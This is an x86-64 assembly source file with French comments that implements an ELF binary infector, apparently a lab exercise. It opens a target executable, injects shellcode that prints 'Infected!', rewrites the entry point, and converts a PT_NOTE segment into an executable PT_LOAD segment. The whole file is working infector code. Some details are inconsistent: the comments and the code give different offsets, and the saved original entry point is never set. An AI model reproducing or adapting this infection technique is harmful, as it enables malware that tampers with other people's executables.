section .text
    global _start

shellcode:
    ; Affiche "Infected!"
    mov rax, 1              ; syscall: write
    mov rdi, 1              ; stdout
    lea rsi, [rel msg]      ; Adresse du message
    mov rdx, 9              ; Longueur du message
    syscall

    ; retour à l'entry point d'origine
    lea rax, [rel orig_entry]
    mov rbx, [rax]
    add rbx, [rel base_addr]
    jmp rbx

shellcode_len equ $ - shellcode

_start:
    ; calculer la base dynamique 
    call get_base
get_base:
    pop rax
    sub rax, get_base - _start
    mov [rel base_addr], rax

    ; Ouvrir le fichier en écriture
    mov rax, 2              ; syscall: open
    lea rdi, [rel filename] ; Nom du fichier ELF
    mov rsi, 2              ; O_RDWR (lecture-écriture)
    xor rdx, rdx            ; Pas de flags supplémentaires
    syscall
    test rax, rax
    js exit_error
    mov r8, rax             ; Sauvegarde du file descriptor

    ; injecter le shellcode a l'offset 0x368
    mov rax, 8
    mov rdi, r8
    mov rsi, 0x36C
    xor rdx, rdx
    syscall

    mov rax, 1
    mov rdi, r8
    lea rsi, [rel shellcode]
    mov rdx, shellcode_len
    syscall


    ; Modifier l’entry point pour pointer vers 0x1100
    mov rax, 8              ; syscall: lseek
    mov rdi, r8
    mov rsi, 24             ; Offset de l'entry point dans l'en-tête ELF
    xor rdx, rdx
    syscall

    mov rax, 1              ; syscall: write
    mov rdi, r8
    lea rsi, [rel new_entry]
    mov rdx, 8              ; Taille (8 octets pour ELF64)
    syscall

    ; Changer le type PT_NOTE en PT_LOAD
    mov rax, 8              ; syscall: lseek
    mov rdi, r8
    mov rsi, 0x200          ; Offset du 9e segment
    xor rdx, rdx
    syscall

    mov rax, 1              ; syscall: write
    mov rdi, r8
    lea rsi, [rel pt_load_type]
    mov rdx, 4              ; Taille du type (4 octets)
    syscall

    ; Modifier les permissions en lecture et exécution (R E)
    mov rax, 8              ; syscall: lseek
    mov rdi, r8
    mov rsi, 0x200 + 4     ; Offset des permissions
    xor rdx, rdx
    syscall

    mov rax, 1              ; syscall: write
    mov rdi, r8
    lea rsi, [rel permissions]
    mov rdx, 4              ; Taille des permissions (4 octets)
    syscall


    ; Fermer le fichier et terminer
    mov rax, 3              ; syscall: close
    mov rdi, r8
    syscall

    mov rax, 60             ; syscall: exit
    xor rdi, rdi
    syscall

exit_error:
    mov rax, 60
    mov rdi, 1              ; Code d'erreur
    syscall

section .data
msg db "Infected!", 0
filename db "hello", 0
new_entry dq 0x36C
orig_entry dq 0
base_addr dq 0
pt_load_type dd 0x1         ; Type PT_LOAD
permissions dd 0x5          ; Permissions R E
    